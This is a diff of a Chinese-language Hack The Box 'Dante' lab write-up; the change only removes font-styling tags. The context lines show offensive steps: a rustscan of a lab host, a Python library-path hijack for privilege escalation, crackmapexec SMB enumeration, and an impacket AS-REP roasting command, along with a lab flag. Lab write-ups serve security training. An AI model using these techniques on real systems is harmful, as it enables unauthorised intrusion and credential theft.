@@ -123,9 +123,9 @@ DANTE{S0_Much_0vafl0z!}
 ## IP信息
 攻击机IP：10.10.16.80
 
-<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">入口IP: </font><u><font style="color:rgb(46, 119, 229);background-color:rgb(245, 250, 255);">10.10.110.0/24</font></u>
+入口IP: <u>10.10.110.0/24</u>
 
-## <font style="color:#000000;background-color:rgb(245, 250, 255);">rustscan扫描</font>
+## rustscan扫描
 ```c
 ┌──(web)─(root㉿kali)-[/home/kali]
 └─# rustscan -a 10.10.110.100 --ulimit 5000 -- -A 
@@ -2550,7 +2550,7 @@ frank@DANTE-NIX02:~$ ls -al apache_restart.py
 ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
 ```
 
-<font style="color:rgb(51, 51, 51);">可以发现库调用以当前目录优先</font>
+可以发现库调用以当前目录优先
 
 ```c
 import os  
@@ -5827,7 +5827,7 @@ proxychains crackmapexec smb 172.16.2.5
 SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
 ```
 
-<font style="color:#DF2A3F;">domain:DANTE.ADMIN</font>
+domain:DANTE.ADMIN
 
 确定了域
 
@@ -5861,7 +5861,7 @@ jcarrot@DANTE.ADMIN
 lgesley@DANTE.ADMIN
 ```
 
-格式是根据crackmapexec smb 172.16.2.5得到的<font style="color:#DF2A3F;">domain:DANTE.ADMIN</font>
+格式是根据crackmapexec smb 172.16.2.5得到的domain:DANTE.ADMIN
 
 ```plain
 proxychains -q impacket-GetNPUsers DANTE.ADMIN/ -no-pass -dc-ip 172.16.2.5 -usersfile /home/kali/Desktop/htb/dante/NPUser.txt
